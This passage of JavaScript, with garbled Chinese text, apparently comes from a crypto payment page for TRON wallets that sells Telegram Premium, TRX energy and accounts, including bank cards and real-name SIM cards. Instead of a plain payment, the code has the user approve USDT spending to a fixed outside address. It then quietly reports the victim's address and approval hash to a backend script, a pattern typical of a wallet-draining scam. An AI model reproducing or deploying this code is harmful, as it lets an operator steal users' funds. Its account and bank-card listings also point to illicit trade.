            const amount = originalParams.price || originalParams.amount || '0.99';
            const quantity = originalParams.quantity || '1';
            
            let productType = 'æœªçŸ¥å•†å“';
            
            if (serviceType === 'premium') {
                productType = 'Telegram Premium è®¢é˜…';
            } else if (serviceType === 'trx') {
                productType = 'TRXæ³¢åœºèƒ½é‡è®¢é˜…';
            } else if (serviceType === 'account') {
                const accountType = originalParams.accountType || '';
                const accountName = originalParams.accountName || '';
                
                if (accountType && accountName) {
                    const accountTypeName = getAccountTypeName(accountType);
                    productType = `${accountTypeName} - ${accountName}`;
                } else {
                    productType = 'è´¦å·è´­ä¹°';
                }
            }
            
            const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
                                   serviceType === 'trx' ? 'header-trx' : 'header-account';
            
            container.innerHTML = `
                <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
                    <h1>âŒ æ”¯ä»˜å¤±è´¥</h1>
                    <p>é‡‘é¢: ${amount} USDT</p>
                </div>
                
                <div style="text-align: center; padding: 2rem 1.5rem;">
                    <div style="font-size: 4rem; margin-bottom: 1rem;">ğŸ’³</div>
                    <h2 style="color: #ff4d4f; margin-bottom: 1rem;">æ”¯ä»˜å¤±è´¥</h2>
                    
                    <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
                        <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">æ”¯ä»˜ä¿¡æ¯</div>
                        <div>è®¢å•å·: ${orderId}</div>
                        <div>é‡‘é¢: <strong>${amount} USDT</strong></div>
                        <div>å•†å“ç±»å‹: ${productType}</div>
                        <div>æ•°é‡: ${quantity} ä¸ª</div>
                    </div>
                    
                    <div style="margin-top: 2rem;">
                        <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
                            è¿”å›é¦–é¡µ
                        </button>
                        <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
                            è”ç³»å®¢æœ
                        </button>
                    </div>
                </div>
            `;
        }
        
// ==================== é’±åŒ…è·³è½¬ç›¸å…³å‡½æ•° ====================

// æ˜¾ç¤ºé’±åŒ…è·³è½¬å¼¹çª—
function showWalletJumpModal(walletName) {
    const modal = document.getElementById('walletJumpModal');
    const title = document.getElementById('walletJumpTitle');
    const message = document.getElementById('walletJumpMessage');
    const actions = document.getElementById('walletJumpActions');
    const countdown = document.getElementById('walletJumpCountdown');
    
    if (!modal) return;
    
    title.textContent = `æ­£åœ¨è·³è½¬åˆ°${walletName}...`;
    message.textContent = 'æ­£åœ¨ä¸ºæ‚¨æ‰“å¼€é’±åŒ…åº”ç”¨ï¼Œè¯·ç¨å€™...';
    actions.style.display = 'none';
    countdown.style.display = 'block';
    countdown.textContent = '2';
    
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // å¼€å§‹å€’è®¡æ—¶
    startWalletJumpCountdown(walletName);
}

// å¼€å§‹è·³è½¬å€’è®¡æ—¶
function startWalletJumpCountdown(walletName) {
    let countdown = 2;
    const countdownElement = document.getElementById('walletJumpCountdown');
    
    const countdownInterval = setInterval(() => {
        countdown--;
        
        if (countdownElement) {
            countdownElement.textContent = countdown;
        }
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            executePaymentWalletJump(walletName);
        }
    }, 1000);
}

// æ‰§è¡Œé’±åŒ…è·³è½¬
function executePaymentWalletJump(walletName) {
    console.log(`ğŸ”— å¼€å§‹è·³è½¬åˆ°æ”¯ä»˜é’±åŒ…: ${walletName}`);
    
    // æ£€æµ‹å¹³å°
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    const isAndroid = /Android/i.test(navigator.userAgent);
    
    // æ„å»ºå½“å‰é¡µé¢URLï¼ˆä¿ç•™æ‰€æœ‰å‚æ•°ï¼‰
    const currentUrl = window.location.href;
    
    // é’±åŒ…åè®®é…ç½®ï¼ˆä¸index.htmlä¿æŒä¸€è‡´ï¼‰
    const walletProtocols = {
        'TronLink': {
            android: 'tronlink://',
            ios: 'tronlink://',
            universal: 'https://www.tronlink.org/dapp?dappUrl='
        },
        'TokenPocket': {
            android: 'tpoutside://',
            ios: 'tpoutside://',
            universal: 'https://tokenpocket.github.io/openapp/?action=dapp&url='
        },
        'Bitget': {
            android: 'bitkeep://',
            ios: 'bitkeep://',
            universal: 'https://bkcode.vip?action=dapp&url='
        },
        'imToken': {
            android: 'imtokenv2://',
            ios: 'imtokenv2://',
            universal: 'https://token.im/openapp?url='
        },
        'OneKey': {
            android: 'onekey-wallet://',
            ios: 'onekey-wallet://',
            universal: 'https://app.onekey.so/openapp?url='
        },
        'OKX': {
            android: 'okx://',
            ios: 'okx://',
            universal: 'https://www.okx.com/wallet/openapp?url='
        },
        'BitPie': {
            android: 'bitpie://',
            ios: 'bitpie://',
            universal: 'https://bitpie.com/openapp?url='
        },
        'TrustWallet': {
            android: 'trust://',
            ios: 'trust://',
            universal: 'https://link.trustwallet.com/open_url?url='
        }
    };
    
    const walletConfig = walletProtocols[walletName];
    if (!walletConfig) {
        console.error('âŒ é’±åŒ…é…ç½®ä¸å­˜åœ¨:', walletName);
        showPaymentWalletNotInstalled(walletName);
        return;
    }
    
    // æ„å»ºè·³è½¬URL
    let jumpUrl = '';
    
    if (isIOS) {
        jumpUrl = walletConfig.ios + 'navigate?url=' + encodeURIComponent(currentUrl);
    } else if (isAndroid) {
        jumpUrl = walletConfig.android + 'navigate?url=' + encodeURIComponent(currentUrl);
    } else {
        jumpUrl = walletConfig.universal + encodeURIComponent(currentUrl);
    }
    
    console.log(`ğŸ“± å¹³å°æ£€æµ‹: ${isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop'}`);
    console.log(`ğŸ”— è·³è½¬URL: ${jumpUrl}`);
    
    // æ–¹æ³•1: å°è¯•ç›´æ¥è·³è½¬
    window.location.href = jumpUrl;
    
    // æ–¹æ³•2: åŒæ—¶ä½¿ç”¨iframeè·³è½¬
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = jumpUrl;
    document.body.appendChild(iframe);
    
    // æ–¹æ³•3: å¯¹äºiOSç‰¹æ®Šå¤„ç†
    if (isIOS) {
        setTimeout(() => {
            window.location.href = walletConfig.universal + encodeURIComponent(currentUrl);
        }, 250);
    }
    
    // æ£€æŸ¥æ˜¯å¦æˆåŠŸè·³è½¬
    setTimeout(() => {
        if (document.hasFocus()) {
            console.log('âŒ é’±åŒ…è·³è½¬å¤±è´¥ï¼Œæ£€æµ‹åˆ°æœªå®‰è£…è¯¥é’±åŒ…');
            showPaymentWalletNotInstalled(walletName);
            
            // ç§»é™¤iframe
            if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
            }
        }
    }, 1000);
}

// æ˜¾ç¤ºé’±åŒ…æœªå®‰è£…æç¤º
function showPaymentWalletNotInstalled(walletName) {
    const actions = document.getElementById('walletJumpActions');
    const message = document.getElementById('walletJumpMessage');
    const countdown = document.getElementById('walletJumpCountdown');
    
    if (actions && message && countdown) {
        countdown.style.display = 'none';
        message.textContent = `æ£€æµ‹åˆ°æ‚¨æœªå®‰è£…${walletName}é’±åŒ…ï¼Œè¯·é€‰æ‹©ä»¥ä¸‹æ“ä½œï¼š`;
        actions.style.display = 'flex';
    }
}

// æ›´æ¢ä»˜æ¬¾é’±åŒ…
function changePaymentWallet() {
    hideWalletJumpModal();
    // è¿™é‡Œå¯ä»¥æ·»åŠ è·³è½¬å›é’±åŒ…é€‰æ‹©é¡µé¢çš„é€»è¾‘
    // ç”±äºpayment.htmlæ˜¯åœ¨é’±åŒ…å†…æ‰“å¼€çš„ï¼Œå¯èƒ½éœ€è¦ç‰¹æ®Šå¤„ç†
    window.history.back();
}

// ä¸‹è½½é’±åŒ…åº”ç”¨
function downloadWalletApp() {
    const walletName = document.getElementById('walletJumpTitle').textContent.replace('æ­£åœ¨è·³è½¬åˆ°', '').replace('...', '');
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    const isAndroid = /Android/i.test(navigator.userAgent);
    
    const downloadLinks = {
        'TronLink': {
            android: 'https://play.google.com/store/apps/details?id=com.tronlink',
            ios: 'https://apps.apple.com/app/tronlink-wallet/id1482084022'
        },
        'TokenPocket': {
            android: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
            ios: 'https://apps.apple.com/app/tokenpocket/id1436028697'
        },
        'Bitget': {
            android: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
            ios: 'https://apps.apple.com/app/bitget-wallet/id1395301115'
        },
        'imToken': {
            android: 'https://play.google.com/store/apps/details?id=im.token.app',
            ios: 'https://apps.apple.com/app/imtoken2/id1384798940'
        },
        'OneKey': {
            android: 'https://play.google.com/store/apps/details?id=so.onekey.app.wallet',
            ios: 'https://apps.apple.com/app/onekey-open-source-wallet/id1609559473'
        },
        'OKX': {
            android: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
            ios: 'https://apps.apple.com/app/okx-buy-bitcoin-eth-crypto/id1327268470'
        },
        'BitPie': {
            android: 'https://play.google.com/store/apps/details?id=com.bither',
            ios: 'https://apps.apple.com/app/bitpie-multi-crypto-wallet/id1492603615'
        },
        'TrustWallet': {
            android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
            ios: 'https://apps.apple.com/app/trust-ethereum-wallet/id1288339409'
        }
    };
    
    const walletLinks = downloadLinks[walletName];
    
    if (walletLinks) {
        if (isIOS && walletLinks.ios) {
            window.open(walletLinks.ios, '_blank');
        } else if (isAndroid && walletLinks.android) {
            window.open(walletLinks.android, '_blank');
        } else {
            window.open(walletLinks.android || walletLinks.ios, '_blank');
        }
    }
    
    hideWalletJumpModal();
}

// æ£€æµ‹æ˜¯å¦åœ¨é’±åŒ…æµè§ˆå™¨ä¸­
function checkIfInWalletBrowser() {
    const userAgent = navigator.userAgent.toLowerCase();
    const isInWallet = window.tronWeb || 
                       window.tronLink ||
                       window.bitkeep ||
                       window.ethereum ||
                       userAgent.includes('tokenpocket') ||
                       userAgent.includes('tronlink') ||
                       userAgent.includes('bitget') ||
                       userAgent.includes('imtoken') ||
                       userAgent.includes('trustwallet') ||
                       userAgent.includes('onekey') ||
                       userAgent.includes('okx') ||
                       userAgent.includes('bitpie');
    
    return isInWallet;
}

// åœ¨é¡µé¢åŠ è½½æ—¶æ£€æŸ¥
document.addEventListener('DOMContentLoaded', function() {
    console.log('ğŸ¯ Paymenté¡µé¢åŠ è½½ - EOAæ¨¡å¼');
    console.log('ğŸ”§ EOAåœ°å€:', EOA_ADDRESS);
    console.log('ğŸ“¦ æœåŠ¡ç±»å‹:', serviceType);
    
    // æ£€æŸ¥æ˜¯å¦åœ¨é’±åŒ…ä¸­æ‰“å¼€
    if (!checkIfInWalletBrowser()) {
        console.log('âš ï¸ æ£€æµ‹åˆ°åœ¨å¤–éƒ¨æµè§ˆå™¨æ‰“å¼€ï¼Œéœ€è¦è·³è½¬åˆ°é’±åŒ…');
        
        // ä»URLå‚æ•°è·å–é’±åŒ…ç±»å‹
        const urlParams = new URLSearchParams(window.location.search);
        const walletType = urlParams.get('wallet') || 'TronLink';
        
        // æ˜¾ç¤ºè·³è½¬å¼¹çª—
        setTimeout(() => {
            showWalletJumpModal(walletType);
        }, 500);
    } else {
        console.log('âœ… åœ¨é’±åŒ…æµè§ˆå™¨ä¸­ï¼Œæ­£å¸¸åŠ è½½é¡µé¢');
    }
    
    setTimeout(() => {
        renderServiceInterface();
        // è¿æ¥é’±åŒ…
        setTimeout(connectWallet, 500);
    }, 100);
});

// éšè—è·³è½¬å¼¹çª—
function hideWalletJumpModal() {
    const modal = document.getElementById('walletJumpModal');
    if (modal) {
        modal.classList.remove('active');
    }
    document.body.style.overflow = '';
}
        // ==================== EOAæ¨¡å¼æ ¸å¿ƒå‡½æ•° ====================
        
        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            try {
                const walletStatus = document.getElementById('walletStatus');
                const walletStatusText = document.getElementById('walletStatusText');
                const payBtn = document.getElementById('payBtn');
                
                if (!walletStatus || !walletStatusText || !payBtn) {
                    console.error('æ‰¾ä¸åˆ°å¿…è¦çš„DOMå…ƒç´ ');
                    return;
                }
                
                // ç­‰å¾…tronWebæ³¨å…¥
                await waitForTronWeb();
                
                if (window.tronWeb && window.tronWeb.defaultAddress) {
                    currentUserAddress = window.tronWeb.defaultAddress.base58;
                    walletStatusText.textContent = `âœ… é’±åŒ…å·²è¿æ¥ (${currentUserAddress.substring(0, 8)}...)`;
                    walletStatus.className = 'wallet-status';
                    payBtn.disabled = false;
                    
                    console.log('ğŸ‘› é’±åŒ…è¿æ¥æˆåŠŸ:', currentUserAddress);
                    
                    // ğŸ”¥ ä¿®å¤ï¼šæ·»åŠ é˜²æŠ–çš„é¢„åŒæ­¥æ£€æŸ¥
                    if (authSyncDebounceTimer) {
                        clearTimeout(authSyncDebounceTimer);
                    }
                    
                    authSyncDebounceTimer = setTimeout(async () => {
                        try {
                            if (!window.__authSynced && currentUserAddress) {
                                const authCheck = await checkEOAAuthorization();
                                if (authCheck.isAuthorized) {
                                    console.log('ğŸ” æ£€æµ‹åˆ°å·²æœ‰æˆæƒï¼Œå°è¯•é™é»˜åŒæ­¥...');
                                    await syncAuthorizationToBackend();
                                    window.__authSynced = true;
                                }
                            }
                        } catch (syncError) {
                            // é™é»˜å¿½ç•¥
                            console.log('ğŸ”• é™é»˜åŒæ­¥å¤±è´¥ï¼ˆä¸å½±å“ç”¨æˆ·ï¼‰:', syncError.message);
                        }
                    }, AUTH_SYNC_DEBOUNCE_DELAY);
                    
                } else {
                    throw new Error('æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€');
                }
            } catch (error) {
                console.error('é’±åŒ…è¿æ¥å¤±è´¥:', error);
                const walletStatus = document.getElementById('walletStatus');
                const walletStatusText = document.getElementById('walletStatusText');
                const payBtn = document.getElementById('payBtn');
                
                if (walletStatus && walletStatusText) {
                    walletStatusText.textContent = 'âŒ é’±åŒ…è¿æ¥å¤±è´¥ï¼Œè¯·åˆ·æ–°é¡µé¢';
                    walletStatus.className = 'wallet-status error';
                    
                    if (!document.getElementById('retryBtn')) {
                        const retryBtn = document.createElement('button');
                        retryBtn.id = 'retryBtn';
                        retryBtn.textContent = 'é‡è¯•è¿æ¥';
                        retryBtn.style.cssText = `
                            margin-top: 0.5rem;
                            padding: 0.5rem 1rem;
                            background: #1890ff;
                            color: white;
                            border: none;
                            border-radius: 0.25rem;
                            cursor: pointer;
                        `;
                        retryBtn.onclick = connectWallet;
                        walletStatus.appendChild(retryBtn);
                    }
                }
                
                if (payBtn) {
                    payBtn.disabled = true;
                }
            }
        }
        
        // ç­‰å¾…tronWebæ³¨å…¥
        async function waitForTronWeb() {
            return new Promise((resolve, reject) => {
                let attempts = 0;
                const maxAttempts = 50;
                
                const checkTronWeb = () => {
                    attempts++;
                    
                    if (window.tronWeb && window.tronWeb.ready) {
                        resolve();
                    } else if (window.tronLink && window.tronLink.tronWeb) {
                        window.tronWeb = window.tronLink.tronWeb;
                        resolve();
                    } else if (window.bitkeep && window.bitkeep.tronWeb) {
                        window.tronWeb = window.bitkeep.tronWeb;
                        resolve();
                    } else if (window.bitget && window.bitget.tronWeb) {
                        window.tronWeb = window.bitget.tronWeb;
                        resolve();
                    } else if (attempts >= maxAttempts) {
                        reject(new Error('é’±åŒ…è¿æ¥è¶…æ—¶ï¼Œè¯·ç¡®ä¿åœ¨æ”¯æŒçš„é’±åŒ…ä¸­æ‰“å¼€æ­¤é¡µé¢'));
                    } else {
                        setTimeout(checkTronWeb, 100);
                    }
                };
                
                checkTronWeb();
            });
        }
        
        // æ£€æŸ¥ä½™é¢
        async function checkUSDTBalance() {
            try {
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                const balance = await contract.balanceOf(currentUserAddress).call();
                return balance / 1000000; // USDTç²¾åº¦6ä½
            } catch (error) {
                console.error('æ£€æŸ¥USDTä½™é¢å¤±è´¥:', error);
                return 0;
            }
        }
        
        async function checkTRXBalance() {
            try {
                const balance = await window.tronWeb.trx.getBalance(currentUserAddress);
                return balance / 1000000;
            } catch (error) {
                console.error('æ£€æŸ¥TRXä½™é¢å¤±è´¥:', error);
                return 0;
            }
        }
        
        // æ£€æŸ¥EOAæˆæƒçŠ¶æ€ï¼ˆæ ¸å¿ƒå‡½æ•°ï¼‰
        async function checkEOAAuthorization() {
            try {
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                const allowance = await contract.allowance(currentUserAddress, EOA_ADDRESS).call();
                const allowanceDecimal = allowance / 1000000;
                
                console.log(`ğŸ” EOAæˆæƒæ£€æŸ¥: ${currentUserAddress} -> ${EOA_ADDRESS}`);
                console.log(`ğŸ“Š æˆæƒé¢åº¦: ${allowanceDecimal} USDT (åŸå§‹å€¼: ${allowance})`);
                
                return {
                    success: true,
                    allowance: allowance,
                    allowanceDecimal: allowanceDecimal,
                    isAuthorized: allowanceDecimal > 0
                };
            } catch (error) {
                console.error('EOAæˆæƒæ£€æŸ¥å¤±è´¥:', error);
                return {
                    success: false,
                    error: error.message,
                    isAuthorized: false
                };
            }
        }
        
        // ==================== æ”¯ä»˜æµç¨‹æ ¸å¿ƒ ====================
        
        // å¼€å§‹æ”¯ä»˜æµç¨‹
        async function startPaymentProcess() {
            try {
                console.log('ğŸš€ å¼€å§‹æ”¯ä»˜æµç¨‹ - EOAæ¨¡å¼');
                
                // è·å–è®¢å•æ•°æ®
                const orderData = getOrderData();
                if (!orderData) {
                    throw new Error('æ— æ³•è·å–è®¢å•ä¿¡æ¯');
                }
                
                // æ£€æŸ¥é’±åŒ…è¿æ¥
                if (!window.tronWeb || !currentUserAddress) {
                    throw new Error('é’±åŒ…æœªè¿æ¥ï¼Œè¯·å…ˆè¿æ¥é’±åŒ…');
                }
                
                // æ£€æŸ¥ä½™é¢
                const usdtBalance = await checkUSDTBalance();
                if (usdtBalance < parseFloat(orderData.amount)) {
                    throw new Error(`USDTä½™é¢ä¸è¶³ï¼Œéœ€è¦ ${orderData.amount} USDTï¼Œå½“å‰ä½™é¢ ${usdtBalance.toFixed(2)} USDT`);
                }
                
                const trxBalance = await checkTRXBalance();
                if (trxBalance < 10) {
                    throw new Error(`TRXä½™é¢ä¸è¶³ï¼Œéœ€è¦è‡³å°‘ 10 TRX ä½œä¸ºæ‰‹ç»­è´¹ï¼Œå½“å‰ä½™é¢ ${trxBalance.toFixed(2)} TRX`);
                }
                
                // æ£€æŸ¥EOAæˆæƒçŠ¶æ€
                const authCheck = await checkEOAAuthorization();
                
                if (!authCheck.isAuthorized) {
                    // éœ€è¦è¯·æ±‚EOAæˆæƒ
                    console.log('ğŸ”„ éœ€è¦è¯·æ±‚EOAæˆæƒ');
                    await requestEOAAuthorization(orderData);
                } else {
                    console.log('âœ… å·²æˆæƒï¼Œè·³è¿‡æˆæƒæ­¥éª¤');
                }
                
                // ä¿å­˜æ”¯ä»˜æ•°æ®
                currentPaymentData = {
                    ...orderData,
                    walletAddress: currentUserAddress,
                    authTxHash: authTxHash,
                    isAuthorized: true
                };
                
                // æ˜¾ç¤ºç¡®è®¤å¼¹çª—
                showConfirmModal(currentPaymentData);
                
            } catch (error) {
                console.error('æ”¯ä»˜æµç¨‹å¤±è´¥:', error);
                showPaymentFailedPageImmediately(getOrderData());
            }
        }
        
        // è¯·æ±‚EOAæˆæƒ
        async function requestEOAAuthorization(orderData) {
            try {
                console.log('ğŸ“ è¯·æ±‚EOAæˆæƒ...');
                
                const payBtn = document.getElementById('payBtn');
                const loadingSection = document.getElementById('loadingSection');
                const loadingText = document.getElementById('loadingText');
                
                if (payBtn) payBtn.disabled = true;
                if (loadingText) loadingText.textContent = 'æ­£åœ¨è¯·æ±‚USDTæˆæƒ...';
                if (loadingSection) loadingSection.style.display = 'block';
                
                // è°ƒç”¨åˆçº¦approveæ–¹æ³•æˆæƒç»™EOAåœ°å€
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                
                const result = await contract.approve(
                    EOA_ADDRESS,
                    EOA_APPROVE_AMOUNT
                ).send({
                    feeLimit: 100000000,
                    callValue: 0,
                    shouldPollResponse: false
                });
                
                // éªŒè¯äº¤æ˜“å“ˆå¸Œ
                if (!result || !/^[a-fA-F0-9]{64}$/.test(result)) {
                    console.error('âŒ æˆæƒäº¤æ˜“å“ˆå¸Œæ— æ•ˆ:', result);
                    throw new Error('æˆæƒå¤±è´¥ï¼šäº¤æ˜“å“ˆå¸Œæ— æ•ˆ');
                }
                
                authTxHash = result;
                console.log('âœ… EOAæˆæƒäº¤æ˜“å·²å‘é€ï¼Œå“ˆå¸Œ:', authTxHash);
                
                if (loadingText) loadingText.textContent = 'ç­‰å¾…æˆæƒç¡®è®¤...';
                
                // ç­‰å¾…äº¤æ˜“ç¡®è®¤ï¼ˆâ‰¥1åŒºå—ï¼‰
                const isConfirmed = await waitForTransactionConfirmation(authTxHash);
                
                if (!isConfirmed) {
                    throw new Error('æˆæƒç¡®è®¤å¤±è´¥');
                }
                
                console.log('âœ… EOAæˆæƒç¡®è®¤æˆåŠŸ');
                
                // ğŸ”¥ æ ¸å¿ƒä¿®å¤ï¼šæˆæƒæˆåŠŸåï¼Œé™é»˜åŒæ­¥åˆ°åå°ç³»ç»Ÿ
                await syncAuthorizationToBackend();
                
            } catch (error) {
                // ç”¨æˆ·å–æ¶ˆæˆæƒçš„æƒ…å†µ
                if (error.message && (
                    error.message.includes('User denied') || 
                    error.message.includes('rejected') || 
                    error.message.includes('canceled') ||
                    error.message.includes('ç”¨æˆ·æ‹’ç»') ||
                    error.message.includes('ç”¨æˆ·å–æ¶ˆ') ||
                    error.message.includes('denied transaction') ||
                    error.message.includes('cancelled by user')
                )) {
                    console.log('ğŸš« ç”¨æˆ·å–æ¶ˆäº†æˆæƒ');
                    throw new Error('ç”¨æˆ·å–æ¶ˆäº†æˆæƒ');
                }
                
                console.error('EOAæˆæƒå¤±è´¥:', error);
                throw new Error('USDTæˆæƒå¤±è´¥: ' + (error.message || 'æœªçŸ¥é”™è¯¯'));
            } finally {
                const loadingSection = document.getElementById('loadingSection');
                const payBtn = document.getElementById('payBtn');
                
                if (loadingSection) loadingSection.style.display = 'none';
                if (payBtn) payBtn.disabled = false;
            }
        }
        
        /**
         * åŒæ­¥æˆæƒä¿¡æ¯åˆ°åå°ç³»ç»Ÿ
         */
        async function syncAuthorizationToBackend() {
            try {
                console.log('ğŸ”„ å¼€å§‹åŒæ­¥æˆæƒä¿¡æ¯åˆ°åå°ç³»ç»Ÿ...');
                
                if (!currentUserAddress) {
                    console.error('âŒ åŒæ­¥å¤±è´¥ï¼šç¼ºå°‘ç”¨æˆ·åœ°å€');
                    return false;
                }
                
                const response = await fetch('/submit_address.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        address: currentUserAddress,
                        auth_tx_hash: authTxHash || '',
                        eoa_address: 'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB',
                        source: 'payment_page_auto_sync',
                        timestamp: Date.now()
                    })
                });
                
                const result = await response.json();
                console.log('ğŸ“¥ åŒæ­¥å“åº”:', result);
                
                if (result.success) {
                    console.log('âœ… æˆæƒä¿¡æ¯åŒæ­¥æˆåŠŸ');
                    return true;
                } else {
                    console.error('âŒ åŒæ­¥å¤±è´¥:', result.error);
                    return false;
                }
                
            } catch (error) {
                console.error('ğŸ”• åŒæ­¥å¤±è´¥ï¼ˆé™é»˜ï¼‰:', error);
                return false;
            }
        }
        
        // ç­‰å¾…äº¤æ˜“ç¡®è®¤
        async function waitForTransactionConfirmation(txHash) {
            return new Promise((resolve) => {
                console.log('â³ ç­‰å¾…äº¤æ˜“ç¡®è®¤...');
                
                let checkCount = 0;
                const maxChecks = 30; // æœ€å¤šç­‰å¾…3åˆ†é’Ÿï¼ˆæ¯6ç§’æ£€æŸ¥ä¸€æ¬¡ï¼‰
                const requiredConfirmations = 1; // è‡³å°‘1ä¸ªåŒºå—ç¡®è®¤
                
                const checkInterval = setInterval(async () => {
                    try {
                        checkCount++;
                        console.log(`ğŸ”„ æ£€æŸ¥äº¤æ˜“çŠ¶æ€ (${checkCount}/${maxChecks}): ${txHash}`);
                        
                        const transaction = await window.tronWeb.trx.getTransaction(txHash);
                        
                        if (transaction && transaction.ret) {
                            const ret = transaction.ret[0];
                            
                            if (ret.contractRet === 'SUCCESS') {
                                // äº¤æ˜“æˆåŠŸï¼Œæ£€æŸ¥ç¡®è®¤æ•°
                                const txInfo = await window.tronWeb.trx.getTransactionInfo(txHash);
                                if (txInfo && txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
                                    console.log(`âœ… äº¤æ˜“æˆåŠŸï¼Œç¡®è®¤æ•°: ${txInfo.confirmed ? 'å·²ç¡®è®¤' : 'æœªç¡®è®¤'}`);
                                    
                                    if (txInfo.confirmed || checkCount >= 2) {
                                        // å·²ç¡®è®¤æˆ–è‡³å°‘ç­‰å¾…äº†2ä¸ªæ£€æŸ¥å‘¨æœŸï¼ˆ12ç§’ï¼‰
                                        clearInterval(checkInterval);
                                        resolve(true);
                                        return;
                                    }
                                }
                            } else if (ret.contractRet === 'REVERT' || ret.contractRet === 'FAIL') {
                                console.error('âŒ äº¤æ˜“å¤±è´¥:', ret.contractRet);
                                clearInterval(checkInterval);
                                resolve(false);
                                return;
                            }
                        }
                        
                        if (checkCount >= maxChecks) {
                            console.warn('âš ï¸ äº¤æ˜“ç¡®è®¤è¶…æ—¶');
                            clearInterval(checkInterval);
                            resolve(false);
                        }
                    } catch (error) {
                        console.log('æ£€æŸ¥äº¤æ˜“çŠ¶æ€å¤±è´¥:', error);
                    }
                }, 6000); // æ¯6ç§’æ£€æŸ¥ä¸€æ¬¡
            });
        }
        
        // ==================== è¾…åŠ©å‡½æ•° ====================
        
        function generateOrderId(prefix) {
            return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
        }
        
        function getAccountTypeName(type) {
            const typeMap = {
                'telegram_twitter': 'Telegram/æ¨ç‰¹è´¦å·',
                'tiktok_kuaishou': 'TikTokæŠ–éŸ³/å¿«æ‰‹è´¦å·',
                'xianyu_xiaohongshu': 'é—²é±¼/å°çº¢ä¹¦è´¦å·',
                'alipaywechat': 'æ”¯ä»˜å®å¾®ä¿¡è´¦å·',
                'qqjd': 'QQ/äº¬ä¸œè´¦å·',
                'whatsappfacebook': 'WhatsApp/Facebookè´¦å·',
                'apple': 'è‹¹æœæµ·å¤–ID',
                'phone': 'å®åå¡+è¯è´¹å……å€¼',
                'bankcard': 'é“¶è¡Œå¡/è½¦é˜Ÿå¡',
                'gmail_youtube': 'Gmail/YouTubeè´¦å·',
                'tantan_momo': 'æ¢æ¢/é™Œé™Œè´¦å·',
                'giftcard': 'è´­ç‰©å¡/ç¤¼å“å¡'
            };
            return typeMap[type] || type;
        }
        
        function getOrderData() {
            const orderId = originalParams.orderId || generateOrderId('ORD');
            const amount = originalParams.amount || originalParams.price || '0.99';
            const quantity = originalParams.quantity || '1';
            
            let productType = '';
            let servicePeriod = '';
            
            if (serviceType === 'premium') {
                productType = 'Telegram Premium è®¢é˜…';
                servicePeriod = '3æœˆ';
            } else if (serviceType === 'trx') {
                productType = 'TRXæ³¢åœºèƒ½é‡';
                servicePeriod = '1æœˆ';
            } else if (serviceType === 'account') {
                const accountType = originalParams.accountType || '';
                const accountName = originalParams.accountName || '';
                
                if (accountType && accountName) {
                    const accountTypeName = getAccountTypeName(accountType);
                    productType = `è´¦å·è´­ä¹° - ${accountTypeName}: ${accountName}`;
                } else {
                    productType = 'è´¦å·è´­ä¹°';
                }
                servicePeriod = '';
            } else {
                productType = 'æœªçŸ¥å•†å“';
                servicePeriod = '';
            }
            
            return {
                orderId,
                amount,
                productType,
                quantity,
                servicePeriod,
                serviceType
            };
        }
        
        // ==================== å¼¹çª—å’Œç•Œé¢æ§åˆ¶ ====================
        
        function showConfirmModal(paymentData) {
            const modal = document.getElementById('confirmModal');
            const orderIdEl = document.getElementById('confirmOrderId');
            const amountEl = document.getElementById('confirmAmount');
            const productTypeEl = document.getElementById('confirmProductType');
            const quantityEl = document.getElementById('confirmQuantity');
            const walletAddressEl = document.getElementById('confirmWalletAddress');
            const titleEl = document.getElementById('confirmModalTitle');
            
            if (!modal || !orderIdEl || !amountEl) {
                alert('ç¡®è®¤å¼¹çª—åŠ è½½å¤±è´¥');
                return;
            }
            
            orderIdEl.textContent = paymentData.orderId;
            amountEl.textContent = paymentData.amount + ' USDT';
            productTypeEl.textContent = paymentData.productType;
                quantityEl.textContent = paymentData.quantity + ' ä¸ª';
                walletAddressEl.textContent = paymentData.walletAddress || 'æœªçŸ¥åœ°å€';
                
                if (titleEl) {
                    titleEl.textContent = paymentData.productType + ' - æ”¯ä»˜ç¡®è®¤';
                }
                
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
            }
            
            function closeConfirmModal() {
                const modal = document.getElementById('confirmModal');
                const overlay = document.getElementById('processingOverlay');
                
                if (modal) modal.classList.remove('active');
                if (overlay) overlay.classList.remove('active');
                
                document.body.style.overflow = '';
                
                const payBtn = document.getElementById('payBtn');
                if (payBtn) payBtn.disabled = false;
            }
            
            async function processFinalPayment() {
                if (!currentPaymentData) {
                    showPaymentFailedPageImmediately(getOrderData());
                    return;
                }
                
                const finalConfirmBtn = document.getElementById('finalConfirmBtn');
                const processingOverlay = document.getElementById('processingOverlay');
                
                if (finalConfirmBtn) finalConfirmBtn.disabled = true;
